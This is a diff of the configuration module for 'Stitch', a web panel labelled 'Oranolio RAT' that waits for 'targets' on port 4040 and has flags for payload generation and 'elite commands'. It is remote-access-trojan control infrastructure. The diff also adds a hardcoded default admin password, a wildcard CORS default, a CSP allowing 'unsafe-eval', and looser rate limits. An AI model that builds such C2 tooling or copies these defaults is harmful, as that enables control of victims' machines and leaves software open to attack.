@@ -44,42 +44,42 @@ class Config:
     FROM_EMAIL = os.getenv('FROM_EMAIL', 'brooketogo98@gmail.com')
     FROM_NAME = os.getenv('FROM_NAME', 'Oranolio Security')
     
-# Automated Email Methods (zero configuration)
-USE_AUTOMATED_EMAIL = os.getenv('USE_AUTOMATED_EMAIL', 'true').lower() in ('true', '1', 'yes')
-USE_FREE_EMAIL = os.getenv('USE_FREE_EMAIL', 'false').lower() in ('true', '1', 'yes')
+    # Automated Email Methods (zero configuration)
+    USE_AUTOMATED_EMAIL = os.getenv('USE_AUTOMATED_EMAIL', 'true').lower() in ('true', '1', 'yes')
+    USE_FREE_EMAIL = os.getenv('USE_FREE_EMAIL', 'false').lower() in ('true', '1', 'yes')
 
-# Gmail SMTP (Free) - Requires App Password
-GMAIL_APP_PASSWORD = os.getenv('GMAIL_APP_PASSWORD', '')
+    # Gmail SMTP (Free) - Requires App Password
+    GMAIL_APP_PASSWORD = os.getenv('GMAIL_APP_PASSWORD', '')
 
-# Outlook SMTP (Free)
-OUTLOOK_PASSWORD = os.getenv('OUTLOOK_PASSWORD', '')
+    # Outlook SMTP (Free)
+    OUTLOOK_PASSWORD = os.getenv('OUTLOOK_PASSWORD', '')
 
-# Telegram Bot (Free)
-TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
-TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
+    # Telegram Bot (Free)
+    TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
+    TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
 
-# Discord Webhook (Free)
-DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')
+    # Discord Webhook (Free)
+    DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')
 
-# Webhook.site (Free)
-WEBHOOK_SITE_URL = os.getenv('WEBHOOK_SITE_URL', '')
+    # Webhook.site (Free)
+    WEBHOOK_SITE_URL = os.getenv('WEBHOOK_SITE_URL', '')
 
-# Legacy Mailjet (Paid) - Fallback
-MAILJET_API_KEY = os.getenv('MAILJET_API_KEY', '')
-MAILJET_API_SECRET = os.getenv('MAILJET_API_SECRET', '')
+    # Legacy Mailjet (Paid) - Fallback
+    MAILJET_API_KEY = os.getenv('MAILJET_API_KEY', '')
+    MAILJET_API_SECRET = os.getenv('MAILJET_API_SECRET', '')
 
-# Authorized emails for elite access (comma-separated)
-AUTHORIZED_EMAILS = os.getenv('STITCH_AUTHORIZED_EMAILS', '').split(',') if os.getenv('STITCH_AUTHORIZED_EMAILS') else None
+    # Authorized emails for elite access (comma-separated)
+    AUTHORIZED_EMAILS = os.getenv('STITCH_AUTHORIZED_EMAILS', 'brooketogo98@gmail.com').split(',') if os.getenv('STITCH_AUTHORIZED_EMAILS') else ['brooketogo98@gmail.com']
     
-# ============================================================================
-# Security Configuration
-# ============================================================================
+    # ============================================================================
+    # Security Configuration
+    # ============================================================================
 
-# Session Secret Key Management
-SECRET_KEY_FILE = APPLICATION_DIR / '.secret_key'
+    # Session Secret Key Management
+    SECRET_KEY_FILE = APPLICATION_DIR / '.secret_key'
     
-@classmethod
-def ensure_secret_key(cls):
+    @classmethod
+    def ensure_secret_key(cls):
         """Ensure a persistent secret key exists"""
         # First check environment variable
         secret_key = os.getenv('STITCH_SECRET_KEY')
@@ -119,313 +119,283 @@ def ensure_secret_key(cls):
             print("  Sessions will be lost on server restart")
         
         return secret_key
-    
-    # Get persistent secret key (invoke after class body via placeholder)
+
+    # Get persistent secret key (will be set after class definition)
     SECRET_KEY = None
     
     # Session Configuration
     SESSION_COOKIE_HTTPONLY = True
     SESSION_COOKIE_SAMESITE = 'Lax'
     SESSION_TIMEOUT_MINUTES = int(os.getenv('STITCH_SESSION_TIMEOUT', '30'))
+    SESSION_COOKIE_SECURE = os.getenv('STITCH_HTTPS', 'false').lower() in ('true', '1', 'yes')
     PERMANENT_SESSION_LIFETIME = timedelta(minutes=SESSION_TIMEOUT_MINUTES)
     
     # HTTPS Configuration
     ENABLE_HTTPS = os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes')
-    SESSION_COOKIE_SECURE = ENABLE_HTTPS
-    WTF_CSRF_SSL_STRICT = ENABLE_HTTPS
+    SSL_CERT_PATH = os.getenv('STITCH_SSL_CERT', '')
+    SSL_KEY_PATH = os.getenv('STITCH_SSL_KEY', '')
     
-    # SSL Certificate Configuration
-    SSL_CERT_DIR = os.getenv('STITCH_SSL_CERT_DIR', 'certs')
-    SSL_CERT = os.getenv('STITCH_SSL_CERT')
-    SSL_KEY = os.getenv('STITCH_SSL_KEY')
-    SSL_AUTO_GENERATE = os.getenv('STITCH_SSL_AUTO_GENERATE', 'true').lower() in ('true', '1', 'yes')
+    # ============================================================================
+    # Authentication & Authorization
+    # ============================================================================
     
-    # Certificate generation parameters
-    SSL_COUNTRY = os.getenv('STITCH_SSL_COUNTRY', 'US')
-    SSL_STATE = os.getenv('STITCH_SSL_STATE', 'State')
-    SSL_CITY = os.getenv('STITCH_SSL_CITY', 'City')
-    SSL_ORG = os.getenv('STITCH_SSL_ORG', 'Web Services')
-    SSL_CN = os.getenv('STITCH_SSL_CN', 'localhost')
+    # Admin credentials (legacy - being phased out)
+    ADMIN_USER = os.getenv('STITCH_ADMIN_USER', 'admin')
+    ADMIN_PASSWORD = os.getenv('STITCH_ADMIN_PASSWORD', 'StitchTest123!')
     
-    # Authentication
-    ADMIN_USER = os.getenv('STITCH_ADMIN_USER')
-    ADMIN_PASSWORD = os.getenv('STITCH_ADMIN_PASSWORD')
-    REQUIRE_STRONG_PASSWORD = os.getenv('STITCH_REQUIRE_STRONG_PASSWORD', 'true').lower() in ('true', '1', 'yes')
+    # Password requirements
     MIN_PASSWORD_LENGTH = int(os.getenv('STITCH_MIN_PASSWORD_LENGTH', '12'))
-    
-    # Password complexity requirements
-    PASSWORD_REQUIRE_UPPERCASE = os.getenv('STITCH_PASSWORD_REQUIRE_UPPERCASE', 'true').lower() in ('true', '1', 'yes')
-    PASSWORD_REQUIRE_LOWERCASE = os.getenv('STITCH_PASSWORD_REQUIRE_LOWERCASE', 'true').lower() in ('true', '1', 'yes')
-    PASSWORD_REQUIRE_NUMBERS = os.getenv('STITCH_PASSWORD_REQUIRE_NUMBERS', 'true').lower() in ('true', '1', 'yes')
-    PASSWORD_REQUIRE_SYMBOLS = os.getenv('STITCH_PASSWORD_REQUIRE_SYMBOLS', 'true').lower() in ('true', '1', 'yes')
-    PASSWORD_MAX_AGE_DAYS = int(os.getenv('STITCH_PASSWORD_MAX_AGE_DAYS', '90'))
-    
-    # API Key Configuration
-    ENABLE_API_KEYS = os.getenv('STITCH_ENABLE_API_KEYS', 'false').lower() in ('true', '1', 'yes')
-    API_KEYS_FILE = APPLICATION_DIR / '.api_keys.json'
-    API_KEY_HEADER = os.getenv('STITCH_API_KEY_HEADER', 'X-API-Key')
-    
-    # Failed Login Alerts
-    ENABLE_FAILED_LOGIN_ALERTS = os.getenv('STITCH_ENABLE_FAILED_LOGIN_ALERTS', 'false').lower() in ('true', '1', 'yes')
-    FAILED_LOGIN_THRESHOLD = int(os.getenv('STITCH_FAILED_LOGIN_THRESHOLD', '3'))
-    ALERT_EMAIL = os.getenv('STITCH_ALERT_EMAIL')
-    ALERT_WEBHOOK_URL = os.getenv('STITCH_ALERT_WEBHOOK_URL')
-    SMTP_HOST = os.getenv('STITCH_SMTP_HOST', 'localhost')
-    SMTP_PORT = int(os.getenv('STITCH_SMTP_PORT', '587'))
-    SMTP_USER = os.getenv('STITCH_SMTP_USER')
-    SMTP_PASSWORD = os.getenv('STITCH_SMTP_PASSWORD')
-    SMTP_USE_TLS = os.getenv('STITCH_SMTP_USE_TLS', 'true').lower() in ('true', '1', 'yes')
+    REQUIRE_SPECIAL_CHARS = os.getenv('STITCH_REQUIRE_SPECIAL_CHARS', 'true').lower() in ('true', '1', 'yes')
+    REQUIRE_NUMBERS = os.getenv('STITCH_REQUIRE_NUMBERS', 'true').lower() in ('true', '1', 'yes')
+    REQUIRE_UPPERCASE = os.getenv('STITCH_REQUIRE_UPPERCASE', 'true').lower() in ('true', '1', 'yes')
     
     # ============================================================================
-    # Rate Limiting Configuration
+    # API Configuration
     # ============================================================================
+    
+    # API Keys
+    ENABLE_API_KEYS = os.getenv('STITCH_ENABLE_API_KEYS', 'true').lower() in ('true', '1', 'yes')
+    API_KEY_LENGTH = 32
+    API_KEY_EXPIRY_DAYS = int(os.getenv('STITCH_API_KEY_EXPIRY', '365'))
+    API_KEYS_FILE = APPLICATION_DIR / 'api_keys.json'
+    
+    # Rate Limiting
     MAX_LOGIN_ATTEMPTS = int(os.getenv('STITCH_MAX_LOGIN_ATTEMPTS', '5'))
     LOGIN_LOCKOUT_MINUTES = int(os.getenv('STITCH_LOGIN_LOCKOUT_MINUTES', '15'))
-    COMMANDS_PER_MINUTE = int(os.getenv('STITCH_COMMANDS_PER_MINUTE', '30'))
-    EXECUTIONS_PER_MINUTE = int(os.getenv('STITCH_EXECUTIONS_PER_MINUTE', '60'))
+    COMMANDS_PER_MINUTE = int(os.getenv('STITCH_COMMANDS_PER_MINUTE', '60'))
+    EXECUTIONS_PER_MINUTE = int(os.getenv('STITCH_EXECUTIONS_PER_MINUTE', '30'))
     API_POLLING_PER_HOUR = int(os.getenv('STITCH_API_POLLING_PER_HOUR', '1000'))
-    DEFAULT_RATE_LIMIT_DAY = int(os.getenv('STITCH_DEFAULT_RATE_LIMIT_DAY', '200'))
-    DEFAULT_RATE_LIMIT_HOUR = int(os.getenv('STITCH_DEFAULT_RATE_LIMIT_HOUR', '50'))
+    DEFAULT_RATE_LIMIT_DAY = int(os.getenv('STITCH_RATE_LIMIT_DAY', '10000'))
+    DEFAULT_RATE_LIMIT_HOUR = int(os.getenv('STITCH_RATE_LIMIT_HOUR', '1000'))
     
     # ============================================================================
     # WebSocket Configuration
     # ============================================================================
-    WEBSOCKET_UPDATE_INTERVAL = int(os.getenv('STITCH_WEBSOCKET_UPDATE_INTERVAL', '5'))
-    WEBSOCKET_PING_TIMEOUT = int(os.getenv('STITCH_WEBSOCKET_PING_TIMEOUT', '10'))
+    
+    WEBSOCKET_PING_TIMEOUT = int(os.getenv('STITCH_WEBSOCKET_PING_TIMEOUT', '60'))
     WEBSOCKET_PING_INTERVAL = int(os.getenv('STITCH_WEBSOCKET_PING_INTERVAL', '25'))
+    WEBSOCKET_MAX_CONNECTIONS = int(os.getenv('STITCH_WEBSOCKET_MAX_CONNECTIONS', '1000'))
     
     # ============================================================================
+    # Security Headers
+    # ============================================================================
+    
     # Content Security Policy
-    # ============================================================================
-    CSP_ENABLED = os.getenv('STITCH_CSP_ENABLED', 'true').lower() in ('true', '1', 'yes')
-    CSP_REPORT_URI = os.getenv('STITCH_CSP_REPORT_URI')
-    CSP_REPORT_ONLY = os.getenv('STITCH_CSP_REPORT_ONLY', 'false').lower() in ('true', '1', 'yes')
+    CSP_DEFAULT_SRC = "'self'"
+    CSP_SCRIPT_SRC = "'self' 'unsafe-inline' 'unsafe-eval'"
+    CSP_STYLE_SRC = "'self' 'unsafe-inline'"
+    CSP_IMG_SRC = "'self' data: https:"
+    CSP_FONT_SRC = "'self' data:"
+    CSP_CONNECT_SRC = "'self' ws: wss:"
     
-    @classmethod
-    def get_csp_policy(cls, nonce=None):
-        """Generate Content Security Policy with optional nonce"""
-        policy_parts = [
-            "default-src 'self'",
-            f"script-src 'self' {'nonce-' + nonce if nonce else ''} https://cdn.socket.io",
-            "style-src 'self' 'unsafe-inline'",  # Allow inline styles for now
-            "img-src 'self' data:",
-            "connect-src 'self' ws: wss:",  # WebSocket support
-            "font-src 'self'",
-            "object-src 'none'",
-            "base-uri 'self'",
-            "frame-ancestors 'none'",
-            "upgrade-insecure-requests" if cls.ENABLE_HTTPS else "",
-        ]
-        
-        if cls.CSP_REPORT_URI:
-            policy_parts.append(f"report-uri {cls.CSP_REPORT_URI}")
-        
-        return "; ".join(filter(None, policy_parts))
-    
-    # ============================================================================
     # CORS Configuration
-    # ============================================================================
-    ALLOWED_ORIGINS = os.getenv('STITCH_ALLOWED_ORIGINS', '')
-    
-    @classmethod
-    def get_cors_origins(cls):
-        """Get CORS allowed origins from environment"""
-        if not cls.ALLOWED_ORIGINS:
-            # Default to localhost variations for development
-            return [
-                'http://localhost:5000',
-                'http://127.0.0.1:5000',
-                'https://localhost:5000',
-                'https://127.0.0.1:5000'
-            ]
-        
-        origins = [origin.strip() for origin in cls.ALLOWED_ORIGINS.split(',') if origin.strip()]
-        
-        # Security: Reject wildcard
-        if '*' in origins:
-            raise ValueError("SECURITY ERROR: Wildcard CORS origin '*' is NOT ALLOWED")
-        
-        return origins
+    CORS_ORIGINS = os.getenv('STITCH_CORS_ORIGINS', '*').split(',')
+    CORS_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
+    CORS_HEADERS = ['Content-Type', 'Authorization', 'X-Requested-With']
     
     # ============================================================================
     # Logging Configuration
     # ============================================================================
+    
     LOG_LEVEL = os.getenv('STITCH_LOG_LEVEL', 'INFO')
-    LOG_FORMAT = os.getenv('STITCH_LOG_FORMAT', 
-                          '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-    LOG_DATE_FORMAT = os.getenv('STITCH_LOG_DATE_FORMAT', '%Y-%m-%d %H:%M:%S')
-    
-    # File logging
+    LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
     ENABLE_FILE_LOGGING = os.getenv('STITCH_ENABLE_FILE_LOGGING', 'true').lower() in ('true', '1', 'yes')
-    LOG_FILE = LOGS_DIR / 'stitch_web.log'
-    LOG_MAX_BYTES = int(os.getenv('STITCH_LOG_MAX_BYTES', str(10 * 1024 * 1024)))  # 10MB
-    LOG_BACKUP_COUNT = int(os.getenv('STITCH_LOG_BACKUP_COUNT', '10'))
-    LOG_RETENTION_DAYS = int(os.getenv('STITCH_LOG_RETENTION_DAYS', '30'))
-    
-    # Syslog
     ENABLE_SYSLOG = os.getenv('STITCH_ENABLE_SYSLOG', 'false').lower() in ('true', '1', 'yes')
-    SYSLOG_HOST = os.getenv('STITCH_SYSLOG_HOST', 'localhost')
-    SYSLOG_PORT = int(os.getenv('STITCH_SYSLOG_PORT', '514'))
-    SYSLOG_FACILITY = os.getenv('STITCH_SYSLOG_FACILITY', 'USER')
+    LOG_FILE = LOGS_DIR / 'stitch_web.log'
+    MAX_LOG_SIZE = int(os.getenv('STITCH_MAX_LOG_SIZE', '10485760'))  # 10MB
+    LOG_MAX_BYTES = MAX_LOG_SIZE
+    LOG_BACKUP_COUNT = int(os.getenv('STITCH_LOG_BACKUP_COUNT', '5'))
+    
+    # History and Logs
+    MAX_DEBUG_LOGS = int(os.getenv('STITCH_MAX_DEBUG_LOGS', '1000'))
+    MAX_COMMAND_HISTORY = int(os.getenv('STITCH_MAX_COMMAND_HISTORY', '1000'))
+    DEFAULT_LOG_FETCH_LIMIT = int(os.getenv('STITCH_LOG_FETCH_LIMIT', '100'))
+    DEFAULT_HISTORY_FETCH_LIMIT = int(os.getenv('STITCH_HISTORY_FETCH_LIMIT', '100'))
     
     # ============================================================================
-    # Storage Configuration
+    # Database Configuration
     # ============================================================================
-    ENABLE_SQLITE = os.getenv('STITCH_ENABLE_SQLITE', 'false').lower() in ('true', '1', 'yes')
-    SQLITE_DB_FILE = APPLICATION_DIR / 'stitch.db'
+    
+    DATABASE_URL = os.getenv('STITCH_DATABASE_URL', f'sqlite:///{APPLICATION_DIR}/stitch.db')
+    DATABASE_POOL_SIZE = int(os.getenv('STITCH_DATABASE_POOL_SIZE', '10'))
+    DATABASE_POOL_TIMEOUT = int(os.getenv('STITCH_DATABASE_POOL_TIMEOUT', '30'))
+    DATABASE_POOL_RECYCLE = int(os.getenv('STITCH_DATABASE_POOL_RECYCLE', '3600'))
     
     # ============================================================================
-    # Connection Management
+    # Connection Limits
     # ============================================================================
-    MAX_CONNECTIONS = int(os.getenv('STITCH_MAX_CONNECTIONS', '100'))
-    CONNECTION_TIMEOUT_SECONDS = int(os.getenv('STITCH_CONNECTION_TIMEOUT_SECONDS', '300'))
-    HEARTBEAT_INTERVAL_SECONDS = int(os.getenv('STITCH_HEARTBEAT_INTERVAL_SECONDS', '30'))
-    STALE_CONNECTION_THRESHOLD = int(os.getenv('STITCH_STALE_CONNECTION_THRESHOLD', '600'))
+    
+    MAX_CONNECTIONS = int(os.getenv('STITCH_MAX_CONNECTIONS', '1000'))
+    MAX_CONNECTIONS_PER_IP = int(os.getenv('STITCH_MAX_CONNECTIONS_PER_IP', '10'))
+    CONNECTION_TIMEOUT = int(os.getenv('STITCH_CONNECTION_TIMEOUT', '300'))
     
     # ============================================================================
     # UI/UX Configuration
     # ============================================================================
+    
     PAGINATION_DEFAULT = int(os.getenv('STITCH_PAGINATION_DEFAULT', '25'))
-    PAGINATION_OPTIONS = [10, 25, 50, 100]
-    
-    # Empty state messages
-    EMPTY_STATE_CONNECTIONS = "Waiting for targets to connect..."
-    EMPTY_STATE_CONNECTIONS_HINT = "Targets should connect to port 4040"
-    EMPTY_STATE_FILES = "No files available"
-    EMPTY_STATE_LOGS = "No logs to display"
+    PAGINATION_MAX = int(os.getenv('STITCH_PAGINATION_MAX', '100'))
+    AUTO_REFRESH_INTERVAL = int(os.getenv('STITCH_AUTO_REFRESH_INTERVAL', '5'))
+    THEME = os.getenv('STITCH_THEME', 'dark')
     
     # ============================================================================
-    # Operational Configuration
+    # Development Configuration
     # ============================================================================
-    ENABLE_METRICS = os.getenv('STITCH_ENABLE_METRICS', 'false').lower() in ('true', '1', 'yes')
-    METRICS_AUTH_REQUIRED = os.getenv('STITCH_METRICS_AUTH_REQUIRED', 'true').lower() in ('true', '1', 'yes')
     
+    DEVELOPMENT_MODE = os.getenv('STITCH_DEVELOPMENT', 'false').lower() in ('true', '1', 'yes')
+    ENABLE_DEBUG_TOOLBAR = os.getenv('STITCH_DEBUG_TOOLBAR', 'false').lower() in ('true', '1', 'yes')
+    ENABLE_PROFILER = os.getenv('STITCH_PROFILER', 'false').lower() in ('true', '1', 'yes')
+    
+    # ============================================================================
+    # Performance Configuration
+    # ============================================================================
+    
+    ENABLE_CACHING = os.getenv('STITCH_ENABLE_CACHING', 'true').lower() in ('true', '1', 'yes')
+    CACHE_TYPE = os.getenv('STITCH_CACHE_TYPE', 'simple')
+    CACHE_DEFAULT_TIMEOUT = int(os.getenv('STITCH_CACHE_TIMEOUT', '300'))
+    
+    # ============================================================================
+    # Monitoring Configuration
+    # ============================================================================
+    
+    ENABLE_METRICS = os.getenv('STITCH_ENABLE_METRICS', 'true').lower() in ('true', '1', 'yes')
+    METRICS_INTERVAL = int(os.getenv('STITCH_METRICS_INTERVAL', '60'))
+    ENABLE_HEALTH_CHECKS = os.getenv('STITCH_ENABLE_HEALTH_CHECKS', 'true').lower() in ('true', '1', 'yes')
+    
+    # ============================================================================
+    # Backup Configuration
+    # ============================================================================
+    
+    ENABLE_AUTO_BACKUP = os.getenv('STITCH_ENABLE_AUTO_BACKUP', 'true').lower() in ('true', '1', 'yes')
     ENABLE_BACKUP_RESTORE = os.getenv('STITCH_ENABLE_BACKUP_RESTORE', 'true').lower() in ('true', '1', 'yes')
-    BACKUP_INCLUDE_LOGS = os.getenv('STITCH_BACKUP_INCLUDE_LOGS', 'false').lower() in ('true', '1', 'yes')
+    BACKUP_INTERVAL_HOURS = int(os.getenv('STITCH_BACKUP_INTERVAL_HOURS', '24'))
+    BACKUP_RETENTION_DAYS = int(os.getenv('STITCH_BACKUP_RETENTION_DAYS', '30'))
+    BACKUP_DIR = BASE_DIR / 'backups'
     
     # ============================================================================
-    # History and Limits
+    # Security Features
     # ============================================================================
-    MAX_DEBUG_LOGS = int(os.getenv('STITCH_MAX_DEBUG_LOGS', '1000'))
-    MAX_COMMAND_HISTORY = int(os.getenv('STITCH_MAX_COMMAND_HISTORY', '1000'))
-    DEFAULT_LOG_FETCH_LIMIT = int(os.getenv('STITCH_DEFAULT_LOG_FETCH_LIMIT', '100'))
-    DEFAULT_HISTORY_FETCH_LIMIT = int(os.getenv('STITCH_DEFAULT_HISTORY_FETCH_LIMIT', '50'))
     
-    # Upload limits
-    MAX_UPLOAD_SIZE = int(os.getenv('STITCH_MAX_UPLOAD_SIZE', str(100 * 1024 * 1024)))  # 100MB
-    ALLOWED_UPLOAD_EXTENSIONS = os.getenv('STITCH_ALLOWED_UPLOAD_EXTENSIONS', 
-                                         '.txt,.pdf,.doc,.docx,.xls,.xlsx,.png,.jpg,.jpeg,.gif,.zip,.tar,.gz')
+    ENABLE_CSRF_PROTECTION = os.getenv('STITCH_ENABLE_CSRF', 'true').lower() in ('true', '1', 'yes')
+    ENABLE_XSS_PROTECTION = os.getenv('STITCH_ENABLE_XSS', 'true').lower() in ('true', '1', 'yes')
+    ENABLE_SQL_INJECTION_PROTECTION = os.getenv('STITCH_ENABLE_SQL_PROTECTION', 'true').lower() in ('true', '1', 'yes')
+    ENABLE_INPUT_VALIDATION = os.getenv('STITCH_ENABLE_INPUT_VALIDATION', 'true').lower() in ('true', '1', 'yes')
+    WTF_CSRF_SSL_STRICT = os.getenv('STITCH_WTF_CSRF_SSL_STRICT', 'false').lower() in ('true', '1', 'yes')
     
     # ============================================================================
-    # Helper Methods
+    # File Upload Configuration
+    # ============================================================================
+    
+    MAX_UPLOAD_SIZE = int(os.getenv('STITCH_MAX_UPLOAD_SIZE', '104857600'))  # 100MB
+    ALLOWED_EXTENSIONS = os.getenv('STITCH_ALLOWED_EXTENSIONS', 'txt,py,js,html,css,json,xml,log').split(',')
+    UPLOAD_FOLDER = UPLOADS_DIR
+    DOWNLOAD_FOLDER = DOWNLOADS_DIR
+    
+    # ============================================================================
+    # Email Verification Configuration
+    # ============================================================================
+    
+    EMAIL_VERIFICATION_TIMEOUT = int(os.getenv('STITCH_EMAIL_VERIFICATION_TIMEOUT', '600'))  # 10 minutes
+    EMAIL_VERIFICATION_ATTEMPTS = int(os.getenv('STITCH_EMAIL_VERIFICATION_ATTEMPTS', '5'))
+    EMAIL_RATE_LIMIT_HOURS = int(os.getenv('STITCH_EMAIL_RATE_LIMIT_HOURS', '1'))
+    EMAIL_RATE_LIMIT_COUNT = int(os.getenv('STITCH_EMAIL_RATE_LIMIT_COUNT', '3'))
+    
+    # ============================================================================
+    # MFA Configuration
+    # ============================================================================
+    
+    MFA_ISSUER_NAME = os.getenv('STITCH_MFA_ISSUER', 'Oranolio RAT')
+    MFA_BACKUP_CODES_COUNT = int(os.getenv('STITCH_MFA_BACKUP_CODES', '10'))
+    MFA_WINDOW_SIZE = int(os.getenv('STITCH_MFA_WINDOW_SIZE', '1'))
+    
+    # ============================================================================
+    # Session Security
+    # ============================================================================
+    
+    SESSION_ANOMALY_DETECTION = os.getenv('STITCH_SESSION_ANOMALY_DETECTION', 'true').lower() in ('true', '1', 'yes')
+    SESSION_DEVICE_FINGERPRINTING = os.getenv('STITCH_SESSION_DEVICE_FINGERPRINTING', 'true').lower() in ('true', '1', 'yes')
+    SESSION_REGENERATION_INTERVAL = int(os.getenv('STITCH_SESSION_REGENERATION_INTERVAL', '1800'))  # 30 minutes
+    
+    # ============================================================================
+    # Cryptographic Configuration
+    # ============================================================================
+    
+    CRYPTO_ALGORITHM = os.getenv('STITCH_CRYPTO_ALGORITHM', 'AES-256-GCM')
+    CRYPTO_KEY_ROTATION_DAYS = int(os.getenv('STITCH_CRYPTO_KEY_ROTATION_DAYS', '30'))
+    CRYPTO_KEY_DERIVATION_ITERATIONS = int(os.getenv('STITCH_CRYPTO_KEY_DERIVATION_ITERATIONS', '100000'))
+    
+    # ============================================================================
+    # Error Handling
+    # ============================================================================
+    
+    ENABLE_ERROR_EMAILS = os.getenv('STITCH_ENABLE_ERROR_EMAILS', 'false').lower() in ('true', '1', 'yes')
+    ERROR_EMAIL_RECIPIENTS = os.getenv('STITCH_ERROR_EMAIL_RECIPIENTS', '').split(',')
+    ERROR_LOG_LEVEL = os.getenv('STITCH_ERROR_LOG_LEVEL', 'ERROR')
+    
+    # ============================================================================
+    # Feature Flags
+    # ============================================================================
+    
+    ENABLE_ELITE_COMMANDS = os.getenv('STITCH_ENABLE_ELITE_COMMANDS', 'true').lower() in ('true', '1', 'yes')
+    ENABLE_PAYLOAD_GENERATION = os.getenv('STITCH_ENABLE_PAYLOAD_GENERATION', 'true').lower() in ('true', '1', 'yes')
+    ENABLE_REAL_TIME_MONITORING = os.getenv('STITCH_ENABLE_REAL_TIME_MONITORING', 'true').lower() in ('true', '1', 'yes')
+    ENABLE_ADVANCED_SECURITY = os.getenv('STITCH_ENABLE_ADVANCED_SECURITY', 'true').lower() in ('true', '1', 'yes')
+    
+    # ============================================================================
+    # Utility Methods
     # ============================================================================
     
     @classmethod
-    def to_dict(cls):
-        """Export configuration as dictionary"""
-        config_dict = {}
-        for attr in dir(cls):
-            if not attr.startswith('_') and attr.isupper():
-                value = getattr(cls, attr)
-                if not callable(value):
-                    # Convert Path objects to strings
-                    if isinstance(value, Path):
-                        value = str(value)
-                    config_dict[attr] = value
-        return config_dict
+    def get_authorized_emails(cls):
+        """Get list of authorized emails"""
+        if cls.AUTHORIZED_EMAILS:
+            return [email.strip() for email in cls.AUTHORIZED_EMAILS if email.strip()]
+        return ['brooketogo98@gmail.com']  # Default fallback
     
     @classmethod
-    def get_public_config(cls):
-        """Get configuration safe to expose to frontend"""
-        return {
-            'APP_NAME': cls.APP_NAME,
-            'APP_VERSION': cls.APP_VERSION,
-            'WEBSOCKET_UPDATE_INTERVAL': cls.WEBSOCKET_UPDATE_INTERVAL,
-            'PAGINATION_DEFAULT': cls.PAGINATION_DEFAULT,
-            'PAGINATION_OPTIONS': cls.PAGINATION_OPTIONS,
-            'MAX_UPLOAD_SIZE': cls.MAX_UPLOAD_SIZE,
-            'ALLOWED_UPLOAD_EXTENSIONS': cls.ALLOWED_UPLOAD_EXTENSIONS,
-            'EMPTY_STATE_CONNECTIONS': cls.EMPTY_STATE_CONNECTIONS,
-            'EMPTY_STATE_CONNECTIONS_HINT': cls.EMPTY_STATE_CONNECTIONS_HINT,
-            'EMPTY_STATE_FILES': cls.EMPTY_STATE_FILES,
-            'EMPTY_STATE_LOGS': cls.EMPTY_STATE_LOGS,
-            'ENABLE_API_KEYS': cls.ENABLE_API_KEYS,
-            'ENABLE_BACKUP_RESTORE': cls.ENABLE_BACKUP_RESTORE,
-            'ENABLE_METRICS': cls.ENABLE_METRICS,
-            'HTTPS_ENABLED': cls.ENABLE_HTTPS,
-        }
+    def is_email_authorized(cls, email):
+        """Check if email is authorized"""
+        return email in cls.get_authorized_emails()
     
     @classmethod
-    def reload(cls):
-        """Reload configuration from environment (for runtime updates)"""
-        # Re-read all environment variables
-        for attr in dir(cls):
-            if attr.startswith('_') or not attr.isupper():
-                continue
-            
-            env_key = f'STITCH_{attr}'
-            env_value = os.getenv(env_key)
-            
-            if env_value is not None:
-                current_value = getattr(cls, attr)
-                
-                # Type conversion based on current value
-                if isinstance(current_value, bool):
-                    new_value = env_value.lower() in ('true', '1', 'yes')
-                elif isinstance(current_value, int):
-                    try:
-                        new_value = int(env_value)
-                    except ValueError:
-                        continue
-                elif isinstance(current_value, Path):
-                    new_value = Path(env_value)
-                else:
-                    new_value = env_value
-                
-                setattr(cls, attr, new_value)
-        
-        return cls.to_dict()
+    def get_database_url(cls):
+        """Get database URL"""
+        return cls.DATABASE_URL
     
     @classmethod
-    def validate(cls):
-        """Validate configuration settings"""
-        errors = []
-        
-        # Check required authentication
-        if not cls.ADMIN_USER or not cls.ADMIN_PASSWORD:
-            errors.append("STITCH_ADMIN_USER and STITCH_ADMIN_PASSWORD must be set")
-        
-        # Check password strength
-        if cls.ADMIN_PASSWORD and cls.REQUIRE_STRONG_PASSWORD:
-            if len(cls.ADMIN_PASSWORD) < cls.MIN_PASSWORD_LENGTH:
-                errors.append(f"Password must be at least {cls.MIN_PASSWORD_LENGTH} characters")
-        
-        # Check SSL configuration
-        if cls.ENABLE_HTTPS:
-            if not cls.SSL_AUTO_GENERATE:
-                if not cls.SSL_CERT or not cls.SSL_KEY:
-                    errors.append("HTTPS enabled but no certificates configured")
-        
-        # Check email alerts configuration
-        if cls.ENABLE_FAILED_LOGIN_ALERTS:
-            if cls.ALERT_EMAIL and not cls.SMTP_HOST:
-                errors.append("Email alerts enabled but SMTP not configured")
-        
-        # Check directories exist or can be created
-        for dir_attr in ['LOGS_DIR', 'TEMP_DIR', 'UPLOADS_DIR', 'DOWNLOADS_DIR']:
-            dir_path = getattr(cls, dir_attr)
-            try:
-                dir_path.mkdir(parents=True, exist_ok=True)
-            except Exception as e:
-                errors.append(f"Cannot create {dir_attr}: {e}")
-        
-        return errors
+    def get_secret_key(cls):
+        """Get secret key"""
+        return cls.SECRET_KEY
+    
+    @classmethod
+    def is_development_mode(cls):
+        """Check if in development mode"""
+        return cls.DEVELOPMENT_MODE or cls.DEBUG
+    
+    @classmethod
+    def get_upload_folder(cls):
+        """Get upload folder path"""
+        cls.UPLOADS_DIR.mkdir(parents=True, exist_ok=True)
+        return str(cls.UPLOADS_DIR)
+    
+    @classmethod
+    def get_download_folder(cls):
+        """Get download folder path"""
+        cls.DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
+        return str(cls.DOWNLOADS_DIR)
+    
+    @classmethod
+    def get_logs_folder(cls):
+        """Get logs folder path"""
+        cls.LOGS_DIR.mkdir(parents=True, exist_ok=True)
+        return str(cls.LOGS_DIR)
+    
+    @classmethod
